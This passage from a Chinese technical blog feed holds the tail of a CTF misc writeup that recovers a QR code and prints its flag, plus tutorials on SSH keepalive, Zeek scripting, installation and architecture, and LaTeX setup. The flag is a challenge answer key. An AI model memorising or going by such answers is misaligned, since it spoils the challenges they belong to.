Browser功能轻松得到二维码：</p><img src="https://raw.githubusercontent.com/QGrain/picgo-bed/master/figure/frame50.png" srcset="/img/loading.gif" align="middle"><p>那么下一步的目的就很明确了，补齐二维码的定位标识。下载定位标识的图片，通过<a href="https://ps.gaoding.com/" target="_blank" rel="noopener">在线ps</a>贴上去即可：</p><img src="https://raw.githubusercontent.com/QGrain/picgo-bed/master/figure/frame50-fixed.png" srcset="/img/loading.gif" align="middle"><div class="hljs"><pre><code class="hljs txt">flag&#123;e7d478cf6b915f50ab1277f78502a2c5&#125;</code></pre></div><p><strong>题目总结：</strong></p><ul><li>只要工具用得好，不愁flag没得找</li><li>要想做好MISC，害的学好PS</li></ul><h2 id="坚持60s"><a href="#坚持60s" class="headerlink" title="坚持60s"></a>坚持60s</h2><p><strong>题目描述：</strong></p><p><strong>题目分析：</strong></p><p><strong>题目总结：</strong></p><h2 id="gif"><a href="#gif" class="headerlink" title="gif"></a>gif</h2><p>Done, to be completed</p><h2 id="掀桌子"><a href="#掀桌子" class="headerlink" title="掀桌子"></a>掀桌子</h2><p>Done, to be completed</p><h2 id="ext3"><a href="#ext3" class="headerlink" title="ext3"></a>ext3</h2><p>Done, to be completed</p><h2 id="stegano"><a href="#stegano" class="headerlink" title="stegano"></a>stegano</h2><p>Done, to be completed</p><h2 id="SimepleRAR"><a href="#SimepleRAR" class="headerlink" title="SimepleRAR"></a>SimepleRAR</h2><p>Done, to be completed</p><h2 id="base64stego"><a href="#base64stego" class="headerlink" title="base64stego"></a>base64stego</h2><p>todo</p><h2 id="功夫再高也怕菜刀"><a href="#功夫再高也怕菜刀" class="headerlink" title="功夫再高也怕菜刀"></a>功夫再高也怕菜刀</h2><p>todo</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Writeup</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSH保持长连接</title>
    <link href="/2020/03/27/SSH%E4%BF%9D%E6%8C%81%E9%95%BF%E8%BF%9E%E6%8E%A5/"/>
    <url>/2020/03/27/SSH%E4%BF%9D%E6%8C%81%E9%95%BF%E8%BF%9E%E6%8E%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="SSH保持长连接"><a href="#SSH保持长连接" class="headerlink" title="SSH保持长连接"></a>SSH保持长连接</h1><p>SSH登录服务器而较长时间不进行操作，连接会由服务器自动断开，导致控制台卡死。为了保持SSH的长连接，有以下两种方法：</p><a id="more"></a><h2 id="1-客户端主动保持连接"><a href="#1-客户端主动保持连接" class="headerlink" title="1 客户端主动保持连接"></a>1 客户端主动保持连接</h2><ul><li>编辑<code>/etc/ssh/ssh_config</code>或者<code>~/.ssh/config</code>，追加以下内容</li></ul><div class="hljs"><pre><code class="hljs bash">TCPKeepAlive=yes<span class="hljs-comment"># Client每隔 180 秒发送一次KeepAlive请求给Server，然后Server响应从而保持连接</span>ServerAliveInterval 180<span class="hljs-comment"># Client发出请求后，服务器端未响应次数达到3，就自动断开连接。正常情况下，Server基本会响应。</span>ServerAliveCountMax 3</code></pre></div><h2 id="2-服务端主动保持连接"><a href="#2-服务端主动保持连接" class="headerlink" title="2 服务端主动保持连接"></a>2 服务端主动保持连接</h2><ul><li>编辑<code>/etc/ssh/sshd_config</code>，追加以下内容</li></ul><div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment"># Server每隔 180 秒发送一次心跳数据包给Client，然后Client响应从而保持连接</span>ClientAliveInterval 180<span class="hljs-comment"># Server发出请求后，客户端未响应次数达到10，就自动断开连接。正常情况下，Client基本会响应</span>ClientAliveCountMax 10</code></pre></div><ul><li><strong>重启ssh服务</strong>以使配置生效</li></ul><div class="hljs"><pre><code class="hljs bash">systemctl restart sshd</code></pre></div><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.jianshu.com/p/d68b1bf3fc95" target="_blank" rel="noopener">[1] SSH 保持连接</a></p><p><a href="https://blog.csdn.net/Earl_yuan/article/details/50454032" target="_blank" rel="noopener">[2] SSH 保持连接 （解决Broken pipe）</a></p>]]></content>
    
    
    <categories>
      
      <category>Configuration</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>ssh</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Zeek脚本语言(一)</title>
    <link href="/2020/03/16/Zeek%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80-%E4%B8%80/"/>
    <url>/2020/03/16/Zeek%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80-%E4%B8%80/</url>
    
    <content type="html"><![CDATA[<p>本文将主要介绍和讲解Zeek脚本语言的<strong>数据类型</strong>，<strong>基于语法</strong>和<strong>属性</strong></p><a id="more"></a><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><h3 id="基础数据类型"><a href="#基础数据类型" class="headerlink" title="基础数据类型"></a>基础数据类型</h3><p><strong>Zeek有以下内建数据类型</strong></p><table><thead><tr><th>名称</th><th>描述</th></tr></thead><tbody><tr><td><a href="https://docs.zeek.org/en/master/script-reference/types.html#type-bool" target="_blank" rel="noopener"><code>bool</code></a></td><td>布尔型</td></tr><tr><td><a href="https://docs.zeek.org/en/master/script-reference/types.html#type-count" target="_blank" rel="noopener"><code>count</code></a>， <a href="https://docs.zeek.org/en/master/script-reference/types.html#type-int" target="_blank" rel="noopener"><code>int</code></a>， <a href="https://docs.zeek.org/en/master/script-reference/types.html#type-double" target="_blank" rel="noopener"><code>double</code></a></td><td>数值类型</td></tr><tr><td><a href="https://docs.zeek.org/en/master/script-reference/types.html#type-time" target="_blank" rel="noopener"><code>time</code></a>， <a href="https://docs.zeek.org/en/master/script-reference/types.html#type-interval" target="_blank" rel="noopener"><code>interval</code></a></td><td>时间类型</td></tr><tr><td><a href="https://docs.zeek.org/en/master/script-reference/types.html#type-string" target="_blank" rel="noopener"><code>string</code></a></td><td>字符串</td></tr><tr><td><a href="https://docs.zeek.org/en/master/script-reference/types.html#type-pattern" target="_blank" rel="noopener"><code>pattern</code></a></td><td>正则表达式</td></tr><tr><td><a href="https://docs.zeek.org/en/master/script-reference/types.html#type-port" target="_blank" rel="noopener"><code>port</code></a>， <a href="https://docs.zeek.org/en/master/script-reference/types.html#type-addr" target="_blank" rel="noopener"><code>addr</code></a>， <a href="https://docs.zeek.org/en/master/script-reference/types.html#type-subnet" target="_blank" rel="noopener"><code>subnet</code></a></td><td>网络类型</td></tr><tr><td><a href="https://docs.zeek.org/en/master/script-reference/types.html#type-enum" target="_blank" rel="noopener"><code>enum</code></a></td><td>枚举（用户定义类型）</td></tr><tr><td><a href="https://docs.zeek.org/en/master/script-reference/types.html#type-table" target="_blank" rel="noopener"><code>table</code></a>， <a href="https://docs.zeek.org/en/master/script-reference/types.html#type-set" target="_blank" rel="noopener"><code>set</code></a>， <a href="https://docs.zeek.org/en/master/script-reference/types.html#type-vector" target="_blank" rel="noopener"><code>vector</code></a>， <a href="https://docs.zeek.org/en/master/script-reference/types.html#type-record" target="_blank" rel="noopener"><code>record</code></a></td><td>容器类型</td></tr><tr><td><a href="https://docs.zeek.org/en/master/script-reference/types.html#type-function" target="_blank" rel="noopener"><code>function</code></a>， <a href="https://docs.zeek.org/en/master/script-reference/types.html#type-event" target="_blank" rel="noopener"><code>event</code></a>， <a href="https://docs.zeek.org/en/master/script-reference/types.html#type-hook" target="_blank" rel="noopener"><code>hook</code></a></td><td>可执行类型</td></tr><tr><td><a href="https://docs.zeek.org/en/master/script-reference/types.html#type-file" target="_blank" rel="noopener"><code>file</code></a></td><td>文件类型（仅用于写入）</td></tr><tr><td><a href="https://docs.zeek.org/en/master/script-reference/types.html#type-opaque" target="_blank" rel="noopener"><code>opaque</code></a></td><td>不透明类型（用于某些内建功能）</td></tr><tr><td><a href="https://docs.zeek.org/en/master/script-reference/types.html#type-any" target="_blank" rel="noopener"><code>any</code></a></td><td>任何类型（用于函数或容器）</td></tr></tbody></table><p><strong>以下是每一种数据类型的详细说明</strong></p><ul><li><p>**<code>bool</code>**：拥有<code>T</code>和<code>F</code>两种取值。支持比较运算（&#x3D;&#x3D;，!&#x3D;），逻辑运算和绝对值运算（|T|&#x3D;1，|F|&#x3D;0，类型为<code>count</code>）</p></li><li><p>**<code>int</code>**：64位有符号整型。支持算术，比较，逻辑，赋值和绝对值运算（运算结果类型为<code>count</code>）</p></li><li><p>**<code>count</code>**：64位无符号整型。支持的运算符和<code>int</code>相同，其中一元加减运算的结果的类型为<code>int</code></p></li><li><p>**<code>double</code>**：双精度浮点型。支持的运算符与<code>int</code>相同</p></li><li><p>**<code>time</code>**：表示绝对时间的时间类型。<code>time</code>类型仅能通过<code>double_to_time</code>, <code>current_time</code>, <code>network_time</code>内建函数来赋值。<code>time</code>类型支持比较运算符。<code>time</code>类型相减能够产生<code>interval</code>类型数据，<code>time</code>类型的绝对值是<code>double</code>类型</p></li><li><p>**<code>interval</code>**：表示相对时间的时间类型。其格式为数字常数+时间单位，时间单位有<code>usec</code>, <code>msec</code>, <code>sec</code>, <code>min</code>, <code>hr</code>和<code>day</code>。以下几种均为正确的表达形式：<code>3.5 min</code>, <code>3.5min</code>, <code>3.5mins</code>, <code>-12 hr</code></p></li><li><p>**<code>string</code>**：字符串类型。由双引号包括，脚本中不支持多行字符串</p><ul><li>支持<code>+</code>拼接，<code>=</code>和<code>+=</code>来赋值。支持pp比较运算符。取绝对值运算可以计算出字符串的长度。支持<code>in</code>和<code>!in</code>来判断字符串包含关系</li><li>支持<code>\</code>转义如：<code>\\</code>, <code>\n</code>, <code>\t</code>, <code>\v</code>, <code>\b</code>, <code>\r</code>, <code>\f</code>, <code>\a</code>, <code>\onn</code>(n为8进制数码), <code>\xhh</code>(h为16进制数码)。当Zeek无法识别转义字符串时将会忽略<code>\</code>，如<code>\g</code>将会变成<code>g</code></li><li>支持下标法访问字符串中的字符。但是不可以对下表法表示的字符串进行赋值修改，即它们是只读的</li></ul></li><li><p>**<code>pattern</code>**：正则表达式类型。<code>pattern</code>常量是通过两个正斜杠<code>/</code>来创建的，并采用与<a href="http://westes.github.io/flex/manual/Patterns.html" target="_blank" rel="noopener">flex词法分析器</a>语法</p></li><li><p>**<code>port</code>**：表示传输层端口的数据类型。<code>port</code>常量由一个无符号整数和端口类型（<code>\tcp</code>, <code>\udp</code>, <code>\icmp</code> or <code>\unknow</code>）组成</p><ul><li><code>port</code>类型支持比较运算符，且比较顺序为 <code>unknown</code> &lt; <code>tcp</code> &lt; <code>udp</code> &lt; <code>icmp</code>，比如<code>65535/tcp</code> &lt; <code>0/udp</code> </li><li><code>get_port_transport_proto</code>和<code>port_to_count</code>是Zeek内建的函数，分别能够从<code>port</code>型数据提取传输协议（后面的协议字符串）和端口号（前面的<code>count</code>型端口号）</li></ul></li><li><p>**<code>addr</code>**：表示IP地址的类型。支持ipv4和ipv6，且支持其常规的表示方式</p><ul><li>支持比较运算符，比较大小时当作正常数值进行比较。如<code>192.168.99.254</code> &lt; <code>192.168.100.0</code></li><li>可以通过<code>/</code>来产生<code>subnet</code>型数据。并可以用<code>in</code>来判断一个<code>addr</code>是否属于<code>subnet</code></li><li>一个域名数据可能对应多个IP地址，因此常用<code>set[addr]</code>来表示</li></ul></li><li><p>**<code>subnet</code>**：表示子网的类型。由<code>addr</code>和<code>/network_prefix_size</code>组成。如<code>192.168.100.0/24</code>和 <code>[fe80::]/64</code>。<code>subnet</code>类型仅支持<code>==</code>和<code>!=</code> 比较运算符</p></li><li><p>**<code>enum</code>**：枚举类型。且枚举类型的value不具备深层次的结构。仅支持<code>==</code>, <code>!=</code> 和<code>=</code>运算符</p></li></ul><h3 id="高级数据类型"><a href="#高级数据类型" class="headerlink" title="高级数据类型"></a>高级数据类型</h3><p><strong>Zeek还有以下内建数据类型</strong></p><table><thead><tr><th>名称</th><th>描述</th></tr></thead><tbody><tr><td><a href="https://docs.zeek.org/en/master/script-reference/types.html#type-table" target="_blank" rel="noopener"><code>table</code></a>， <a href="https://docs.zeek.org/en/master/script-reference/types.html#type-set" target="_blank" rel="noopener"><code>set</code></a>， <a href="https://docs.zeek.org/en/master/script-reference/types.html#type-vector" target="_blank" rel="noopener"><code>vector</code></a>， <a href="https://docs.zeek.org/en/master/script-reference/types.html#type-record" target="_blank" rel="noopener"><code>record</code></a></td><td>容器类型</td></tr><tr><td><a href="https://docs.zeek.org/en/master/script-reference/types.html#type-function" target="_blank" rel="noopener"><code>function</code></a>， <a href="https://docs.zeek.org/en/master/script-reference/types.html#type-event" target="_blank" rel="noopener"><code>event</code></a>， <a href="https://docs.zeek.org/en/master/script-reference/types.html#type-hook" target="_blank" rel="noopener"><code>hook</code></a></td><td>可执行类型</td></tr><tr><td><a href="https://docs.zeek.org/en/master/script-reference/types.html#type-file" target="_blank" rel="noopener"><code>file</code></a></td><td>文件类型（仅用于写入）</td></tr><tr><td><a href="https://docs.zeek.org/en/master/script-reference/types.html#type-opaque" target="_blank" rel="noopener"><code>opaque</code></a></td><td>不透明类型（用于某些内建功能）</td></tr><tr><td><a href="https://docs.zeek.org/en/master/script-reference/types.html#type-any" target="_blank" rel="noopener"><code>any</code></a></td><td>任何类型（用于函数或容器）</td></tr></tbody></table><ul><li>**<code>table</code>**：表示映射关系的表类型。被映射的值称为<code>index</code>或者<code>indices</code>，映射的结果称为<code>yield</code>。是一种非常高效的索引类型，其内部实质为一个单哈希查找表</li><li>**<code>set</code>**：</li></ul><h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2><h3 id="定义变量"><a href="#定义变量" class="headerlink" title="定义变量"></a>定义变量</h3><h3 id="定义函数"><a href="#定义函数" class="headerlink" title="定义函数"></a>定义函数</h3><h3 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h3><h3 id="条件语句"><a href="#条件语句" class="headerlink" title="条件语句"></a>条件语句</h3><h3 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h3><h2 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h2>]]></content>
    
    
    <categories>
      
      <category>Tutorial</category>
      
    </categories>
    
    
    <tags>
      
      <tag>IDS</tag>
      
      <tag>Zeek</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Zeek安装</title>
    <link href="/2020/03/12/Zeek%E5%AE%89%E8%A3%85/"/>
    <url>/2020/03/12/Zeek%E5%AE%89%E8%A3%85/</url>
    
    <content type="html"><![CDATA[<p>Zeek的安装是一个大坑  (* ￣︿￣)，本文将介绍Zeek的安装教程，然后附上了我的<strong>踩坑记录</strong>和一键安装脚本。</p><a id="more"></a><h2 id="1-先决条件"><a href="#1-先决条件" class="headerlink" title="1 先决条件"></a>1 先决条件</h2><h3 id="1-1-必须的依赖"><a href="#1-1-必须的依赖" class="headerlink" title="1.1 必须的依赖"></a>1.1 必须的依赖</h3><p><strong>运行Zeek所必须的包：</strong></p><ul><li>Libpcap (<a href="http://www.tcpdump.org/" target="_blank" rel="noopener">http://www.tcpdump.org</a>)</li><li>OpenSSL libraries (<a href="http://www.openssl.org/" target="_blank" rel="noopener">http://www.openssl.org</a>)</li><li>BIND8 library</li><li>Libz</li><li>Bash (for BroControl)</li><li>Python &gt;&#x3D; 2.6 (for BroControl)</li></ul><p><strong>从源码安装所必须的包：</strong></p><ul><li>CMake &gt;&#x3D; 2.8 (<a href="http://www.cmake.org/" target="_blank" rel="noopener">http://www.cmake.org</a>)</li><li>Make</li><li>C&#x2F;C++ Compiler with C++11 support (GCC 4.8+ or Clang 3.3+)</li><li>SWIG (<a href="http://www.swig.org/" target="_blank" rel="noopener">http://www.swig.org</a>)</li><li>Bison (GNU Parser Generator)</li><li>Flex (Fast Lexical Analyzer)</li><li>Libpcap headers</li><li>OpenSSL headers</li><li>zlib headers</li><li>Python</li></ul><p><strong>通过包管理安装上述依赖：</strong></p><ul><li><p>RPM&#x2F;RedHat-based Linux：</p><div class="hljs"><pre><code class="hljs bash">sudo yum install cmake make gcc gcc-c++ flex bison libpcap-devel openssl-devel python-devel swig zlib-devel</code></pre></div></li><li><p>DEB&#x2F;Debian-based Linux：</p><div class="hljs"><pre><code class="hljs Bash">sudo apt-get install cmake make gcc g++ flex bison libpcap-dev libssl-dev python-dev swig zlib1g-dev</code></pre></div></li><li><p>FreeBSD： FreeBSD的最小安装已经包含了部分依赖，除了以下需要手动安装</p><div class="hljs"><pre><code class="hljs bash">sudo pkg install bash cmake swig bison python py27-sqlite3</code></pre></div></li></ul><h3 id="1-2-可选的依赖"><a href="#1-2-可选的依赖" class="headerlink" title="1.2 可选的依赖"></a>1.2 可选的依赖</h3><ul><li>C++ Actor Framework (CAF) version 0.14 (<a href="http://actor-framework.org/" target="_blank" rel="noopener">http://actor-framework.org</a>)</li><li>LibGeoIP (用于IP地理定位)</li><li>sendmail (让Bro和BroControl能够发送邮件)</li><li>curl</li><li>gperftools (采用了tcmalloc来改善内存和CPU的使用)</li><li>jemalloc (<a href="http://www.canonware.com/jemalloc/" target="_blank" rel="noopener">http://www.canonware.com/jemalloc/</a>)</li><li>PF_RING (Linux only)</li><li>ipsumdump (for trace-summary; <a href="http://www.cs.ucla.edu/~kohler/ipsumdump" target="_blank" rel="noopener">http://www.cs.ucla.edu/~kohler/ipsumdump</a>)</li></ul><h2 id="2-安装Zeek"><a href="#2-安装Zeek" class="headerlink" title="2 安装Zeek"></a>2 安装Zeek</h2><h3 id="2-1-使用预构建的二进制发行包"><a href="#2-1-使用预构建的二进制发行包" class="headerlink" title="2.1 使用预构建的二进制发行包"></a>2.1 使用预构建的二进制发行包</h3><ul><li><p><strong>官网下载：</strong></p><p>有关二进制版本和安装说明的信息，请参见<a href="https://www.bro.org/download/index.html" target="_blank" rel="noopener">bro下载页面</a>以获取当前受支持&#x2F;目标平台。</p></li><li><p>默认安装路径是<code>/opt/bro</code></p></li></ul><h3 id="2-2-源码安装"><a href="#2-2-源码安装" class="headerlink" title="2.2 源码安装"></a>2.2 源码安装</h3><ul><li><p><strong>官网下载</strong></p><p>Zeek的二进制发行包是和源码绑定在一起的，均可在<a href="https://www.bro.org/download/index.html" target="_blank" rel="noopener">bro下载页面</a>获取</p></li><li><p><strong>通过git下载</strong></p><div class="hljs"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> --recursive git://github.com/zeek/zeek.git</code></pre></div><p>注意：如果选择非递归克隆，则为最小克隆，许多其他依赖的子模块需要额外获取。</p><div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment"># ./configure --help </span>./configuremakemake install<span class="hljs-comment"># 默认安装路径为/usr/local/bro</span></code></pre></div></li><li><p><strong>添加环境变量</strong></p></li></ul><h2 id="3-踩坑记录"><a href="#3-踩坑记录" class="headerlink" title="3 踩坑记录"></a>3 踩坑记录</h2><h3 id="3-1-源码安装"><a href="#3-1-源码安装" class="headerlink" title="3.1 源码安装"></a>3.1 源码安装</h3><ul><li><strong>一定要选择git clone –recursive</strong>，否则以下submodule将需要额外从git安装<ul><li>zeek&#x2F;cmake</li><li>zeek&#x2F;broker</li><li>zeek&#x2F;broker&#x2F;cmake</li><li>zeek&#x2F;broker&#x2F;3rdparty</li><li>zeek&#x2F;broker&#x2F;3rdparty&#x2F;caf (mv from zeek&#x2F;broker&#x2F;aux&#x2F;caf)</li></ul></li><li><strong>zeek&gt;&#x3D;3.0有对于以下软件包有更高版本的要求</strong><ul><li><strong>cmake &gt;&#x3D; 3.0</strong></li><li><strong>C&#x2F;C++ Compiler with C++17 support (GCC 7+ or Clang 4+)</strong></li></ul></li></ul><h3 id="3-2-一键安装脚本"><a href="#3-2-一键安装脚本" class="headerlink" title="3.2 一键安装脚本"></a>3.2 一键安装脚本</h3><p><a href="https://github.com/QGrain/auto-install-zeek" target="_blank" rel="noopener">开源仓库auto-install-zeek</a> :rainbow:</p>]]></content>
    
    
    <categories>
      
      <category>Tutorial</category>
      
    </categories>
    
    
    <tags>
      
      <tag>IDS</tag>
      
      <tag>Zeek</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>开源网络流量分析框架Zeek</title>
    <link href="/2020/03/12/Zeek%E7%AE%80%E4%BB%8B/"/>
    <url>/2020/03/12/Zeek%E7%AE%80%E4%BB%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="1-Zeek基本介绍"><a href="#1-Zeek基本介绍" class="headerlink" title="1 Zeek基本介绍"></a>1 Zeek基本介绍</h1><h2 id="1-1-Overview"><a href="#1-1-Overview" class="headerlink" title="1.1 Overview"></a>1.1 Overview</h2><p>Zeek又名Bro，是一个被动的开源网络流量分析器。它主要是一种安全监视器，可深入检查链接上的所有流量以查找可疑活动的迹象。在安全领域以外，Zeek还能够进行性能测量，故障检测等工作。</p><a id="more"></a><p>1995年劳伦斯伯克利实验室的研究员Vern开始了Bro的开发，并于1996年在实验室进行内部部署，1998年在USENIX安全研讨会进行发表。2003年，美国国家科学基金会（NSF）开始在国际计算机科学研究所（ICSI）上支持Bro的研究和高级开发。2010年NSF通过向ICSI授予SDCI计划中专门用于Bro开发的赠款，美国国家超级计算应用中心（NCSA）作为该团队的核心合作伙伴加入了该计划。现如今Bro团队现在正在努力通过进一步提高系统功能来应对未来网络的挑战，以此取得成功。</p><h2 id="1-2-Architecture"><a href="#1-2-Architecture" class="headerlink" title="1.2 Architecture"></a>1.2 Architecture</h2><p><img src="https://raw.githubusercontent.com/QGrain/picgo-bed/master/figure/architecture.png" srcset="/img/loading.gif"></p><p>由上图可知Zeek的体系结构主要分为两个部分：</p><ul><li><strong>事件引擎：</strong>Event Engine 将传入的数据包流减少为一系列更高级别的<em>events</em>。这些事件以与策略无关的术语反映了网络活动，它描述已看到的内容，但不对现象进行解释或分析。例如它能将线路上的HTTP request都转化为一个相应的<code>http_request</code>事件，该事件包含了请求的IP，端口和URL以及http version等信息。<strong>但是Event Engine不会对此事件进一步解读，如该URL是否对应于已知的恶意站点。</strong></li><li><strong>策略脚本解释器：</strong>上例中的事件语义解析将由Zeek的第二个主要组件Policy Script Interpreter派生。该脚本解释器执行一组Zeek自定义脚本语言编写的<strong>事件处理程序</strong>来对事件进行语义分析。例如一个站点的安全策略将包括监测器检测到不同活动时应该做出的响应等。最重要的是，Zeek允许其脚本随着时间推移而保持工作状态，从而使它们能够跟踪并关联跨连接和主机边界观察到的内容的演变。Bro脚本可以生成实时警报，还可以按需执行任意外部程序，例如触发对攻击的主动响应。</li></ul><h2 id="1-3-Features"><a href="#1-3-Features" class="headerlink" title="1.3 Features"></a>1.3 Features</h2><p>Zeek支持很多基于其脚本的分析，并且即便是不采用自定义脚本，它也能具备以下强大的功能特性：</p><ul><li><p><strong>Deployment</strong></p><ul><li>在标准Unix-Style的商用硬件上运行</li><li>能对来自网络分接头或者监测端口的流量进行完全被动的流量分析</li><li>用于捕获数据包的标准libpcap接口</li><li>实时和离线分析</li><li>对于大规模部署支持集群化，且无论是独立还是集群都采用统一的管理框架</li><li>BSD许可下开源</li></ul></li><li><p><strong>Analysis</strong></p><ul><li>全面记录活动，以进行离线分析和取证</li><li>独立与应用层协议的端口分析</li><li>支持许多应用程序层协议（包括DNS，FTP，HTTP，IRC，SMTP，SSH，SSL）</li><li>分析通过应用层协议交换的文件内容，包括用于指纹识别的MD5 &#x2F; SHA1计算</li><li>全面的IPv6支持</li><li>隧道检测和分析（包括Ayiya，Teredo，GTPv1）。Zeek将隧道解封装，然后继续分析其内容，就像没有隧道一样</li><li>在协议分析过程中进行全面的健全性检查</li><li>支持IDS样式的模式匹配</li></ul></li><li><p><strong>Scripting Language</strong></p><ul><li>图灵完备的语言，用于表达任意分析任务</li><li>基于事件的编程模型</li><li>特定于域的数据类型，例如IP地址（透明地处理IPv4和IPv6），端口号和计时器</li><li>支持基于时间的跟踪和管理网络状态</li></ul></li><li><p><strong>Interfacing</strong></p><ul><li>默认输出到格式良好的ACSII日志</li><li><code>ElasticSearch</code>和<code>DataSeries</code>的备用后端，并将后续支持其它数据接口</li><li>外部输入实时集成到分析中，并将后续支持实时数据库的输入</li><li>外部的C库用于与外部程序交换Zeek的事件，同样支持与Perl，Python和Ruby的绑定</li><li>能够从脚本语言内部触发任意外部进程</li></ul></li></ul><h1 id="2-Zeek集群架构"><a href="#2-Zeek集群架构" class="headerlink" title="2 Zeek集群架构"></a>2 Zeek集群架构</h1><p><strong>为什么Zeek需要集群架构？因为Zeek是是单线程的，因此一旦达到单个处理器内核的限制，当前唯一的方法就是把工作负载分散到多个内核甚至是多个物理机上。</strong></p><h2 id="2-1-Cluster-Architecture"><a href="#2-1-Cluster-Architecture" class="headerlink" title="2.1 Cluster Architecture"></a>2.1 Cluster Architecture</h2><img src="https://raw.githubusercontent.com/QGrain/picgo-bed/main/figure-2022/202210061328175.png" srcset="/img/loading.gif"><p>上图是Zeek的集群架构示意图</p><ul><li><strong>Tap</strong>是一种机制用来拆分数据流并创建副本用于检测。例如交换机上的监测端口和光纤网络上的分光路器。</li><li><strong>Frontend</strong>是一种离散的硬件设备或主机技术，可将流量分为许多流。Zeek的二进制文件并不执行此工作。</li><li><strong>Manager</strong>是一个Zeek的进程，具有两个主要任务。第一个是从集群的其他采用Zeek通信协议的节点接收日志和通知（如果你用的是logger则会取代manager来接收所有的日志）它的输出结果是一个单独的日志而不是许多需要被后期处理组合的离散的日志。第二个任务是它能够作为通知的阻塞节点来进行重复数据删除操作和通知行为化操作（如将通知以邮件形式发送，分页或者阻止）。</li><li><strong>Logger</strong>是一个可选的Zeek进程，它使用Zeek通信协议从群集的其余节点接收日志消息。让logger代替manager接收日志的目的是为了减轻manager的负担。</li><li><strong>Proxy</strong>是一个用于同步状态的Zeek进程，变量能够自动地在连接的Zeek进程间同步。proxy避免了所有worker都相互直连。</li><li><strong>Worker</strong>是嗅探网络流量并对重新组合的流量进行协议分析的Zeek进程。由于一个集群的所有协议解析和大多数分析都将在此处进行，因此建议采用尽可能高性能的内存和CPU。因为几乎所有日志记录都是在远程对manager完成的，并且通常很少写入磁盘，因此workers对磁盘没有特殊要求。</li></ul><h2 id="2-2-Frontend-Options"><a href="#2-2-Frontend-Options" class="headerlink" title="2.2 Frontend Options"></a>2.2 Frontend Options</h2><h3 id="2-2-1-分立的硬件流量平衡器"><a href="#2-2-1-分立的硬件流量平衡器" class="headerlink" title="2.2.1 分立的硬件流量平衡器"></a>2.2.1 分立的硬件流量平衡器</h3><ul><li><strong>cPacket：</strong>如果要监视一个或多个10G物理接口，建议的解决方案是使用cPacket的cFlow或cVu设备，这些设备将通过重写目标以太网MAC地址以使与特定流关联的每个数据包具有相同的目标MAC，来执行第2层负载平衡。然后可以将数据包直接传递到监视主机，在监视主机上，每个worker都有一个BPF Filter以将其可见性限制为仅该流，或者继续传递到商用交换机，以将流量拆分为多个以适配worker的1G接口。从而大大降低成本。</li><li><strong>OpenFlow Switches：</strong>基于OpenFlow的交换机直接在交换机上进行基于流的负载平衡，从而大大降低了许多用户的前端成本。<strong>官方正在探索中…</strong></li></ul><h3 id="2-2-2-主机流量平衡机制"><a href="#2-2-2-主机流量平衡机制" class="headerlink" title="2.2.2 主机流量平衡机制"></a>2.2.2 主机流量平衡机制</h3><ul><li>**PF_RING： **Linux的PF_RING软件具有“群集”功能，该功能将在嗅探同一接口的多个进程之间进行基于流的负载平衡。这使您可以轻松地在单个物理主机中利用多个内核，因为Bro的主事件循环是单线程的，因此无法本机利用所有内核。如果要使用PF_RING，请参阅有关如何使用PF_RING配置Zeek的<a href="http://bro.org/documentation/load-balancing.html" target="_blank" rel="noopener">文档</a>。</li><li><strong>Netmap：</strong> FreeBSD有一个正在进行的名为Netmap的项目，该项目还将启用基于流的负载平衡。<strong>官方正在探索中…</strong></li><li><strong>Software Router：</strong> 可以通过简单的配置用于基于流的负载平衡。由于Zeek的PF_RING支持，因此不建议在Linux上使用此解决方案，并且仅将其作为其他操作系统上的不得已的方法，因为该解决方案会因每个数据包在内核和用户域之间来回上下文切换数次而导致大量开销。</li></ul>]]></content>
    
    
    <categories>
      
      <category>Tutorial</category>
      
    </categories>
    
    
    <tags>
      
      <tag>IDS</tag>
      
      <tag>Zeek</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【LaTeX】VSCode环境配置</title>
    <link href="/2020/01/23/%E3%80%90LaTeX%E3%80%91VSCode%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
    <url>/2020/01/23/%E3%80%90LaTeX%E3%80%91VSCode%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<p>LaTeX + VSCode，新姿势增长了，奇怪的知识也增加了！</p><a id="more"></a><h2 id="1-安装TeXlive"><a href="#1-安装TeXlive" class="headerlink" title="1 安装TeXlive"></a>1 安装TeXlive</h2><ul><li><p>前往<a href="https://www.tug.org/texlive/" target="_blank" rel="noopener">官网</a>下载安装程序：</p><ul><li><a href="http://mirror.ctan.org/systems/texlive/tlnet/install-tl-windows.exe" target="_blank" rel="noopener">Windows安装包</a></li><li><a href="http://mirror.ctan.org/systems/texlive/tlnet/install-tl-unx.tar.gz" target="_blank" rel="noopener">Unix安装包</a></li><li><a href="https://www.tug.org/mactex/mactex-download.html" target="_blank" rel="noopener">MacTeX安装包</a></li></ul></li><li><p>前往国内镜像站下载：<a href="http://mirrors.hust.edu.cn/CTAN/systems/texlive/Images/" target="_blank" rel="noopener">华中大镜像站</a>， <a href="https://mirrors.tuna.tsinghua.edu.cn/CTAN/systems/texlive/Images/" target="_blank" rel="noopener">清华大学镜像站</a>， <a href="https://mirrors.ustc.edu.cn/CTAN/systems/texlive/Images/" target="_blank" 